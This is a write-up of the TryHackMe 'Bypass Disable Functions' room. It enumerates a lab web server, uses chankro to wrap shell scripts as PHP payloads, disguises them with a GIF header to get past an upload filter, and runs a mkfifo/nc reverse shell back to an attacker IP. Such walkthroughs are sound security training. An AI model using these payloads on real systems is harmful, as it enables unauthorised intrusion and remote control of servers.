---
clayout: ctf
title: Bypass Disable Functions
type: TryHackMe
date: 2025-09-25
level: Info
icon: /ctf/tryhackme/bypass-disable-functions/icon-room.png
image: /ctf/tryhackme/bypass-disable-functions/icon-room.png
description: Practice bypassing disabled dangerous features that run operating system commands or start processes.
ctf-link: https://tryhackme.com/room/bypassdisablefunctions
---

## Challenge Overview

This challenge focuses on bypassing PHP security restrictions, specifically the `disable_functions` directive that prevents execution of dangerous system commands.

## Enumeration

### Nmap Scan

```bash
nmap -sCV -A -oN nmap 10.10.208.58
```

**Scan Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Web Enumeration

Navigating to `http://10.10.208.58/` reveals a home page of Hot Jobs.

![Home Page](/ctf/tryhackme/bypass-disable-functions/home.png)

There is a `cv.php` endpoint that accepts an uploaded CV image.

![CV Upload](/ctf/tryhackme/bypass-disable-functions/cv-upload.png)

Directory enumeration with `gobuster` reveals additional entry points and an uploads directory we can interact with.

```bash
gobuster dir -u http://10.10.208.58/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
  -x php -o gobuster.txt
```

**Scan Results:**

```bash
/cv.php               (Status: 200) [Size: 4153]
/phpinfo.php          (Status: 200) [Size: 68160]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.208.58/uploads/]
```

The `/uploads` folder lists uploaded files; after using the `cv.php` upload we can see our file there.

![Uploaded file](/ctf/tryhackme/bypass-disable-functions/uploads.png)

### PHP Info

`/phpinfo.php` discloses configuration and environment details. Of particular interest:

* `DOCUMENT_ROOT` is `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`.
* `disable_functions` contains several disabled functions.

![Disable Functions](/ctf/tryhackme/bypass-disable-functions/disable-functions.png)

Those two facts drive the exploitation approach: the exposed `phpinfo()` gives filesystem locations and the uploads feature accepts files, while disabled PHP functions restrict direct use of some exec-style functions.

### Chankro - PoC

From `phpinfo.php` we confirm the document root:

![DOCUMENT_ROOT](/ctf/tryhackme/bypass-disable-functions/document-root.png)

Create a small shell script that writes the output of `whoami` to a file inside the uploads directory:

```bash
#!/bin/bash
whoami > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/whoami.txt
```

Use `chankro` to wrap the script into a PHP payload:

```bash
python2 chankro.py --arch 64 \
    --input whoami.sh \
    --output whoami.php \
    --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/
```

To bypass upload checks we prepend a GIF header (`GIF89a`) to the generated file so it is accepted as an image by the upload form. Upload the crafted file via `cv.php` and trigger it in a browser:

```url
http://10.10.208.58/uploads/whoami.php
```

The script runs and produces a `whoami.txt` showing the user under which the webserver executed commands.

![Whoami](/ctf/tryhackme/bypass-disable-functions/whoami.png)

This confirms remote command execution despite disabled PHP functions because execution is happening via an on-disk shell script invoked from the uploaded PHP wrapper.

### Chankro - Reverse Shell

Craft a reverse shell script:

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <your-ip> 4444 >/tmp/f
```

Wrap it with chankro:

```bash
python2 chankro.py --arch 64 \
    --input reverse-shell.sh \
    --output reverse-shell.php \
    --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/
```

Start a listener on the attacker machine:

```bash
nc -lnvp 4444
```

Trigger the uploaded payload:

```url
http://10.10.208.58/uploads/reverse-shell.php
```

We obtain a shell as the webserver user.

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!IMPORTANT] Flag
> The `/home/s4vi/flag.txt` file contains the flag for this THM room.
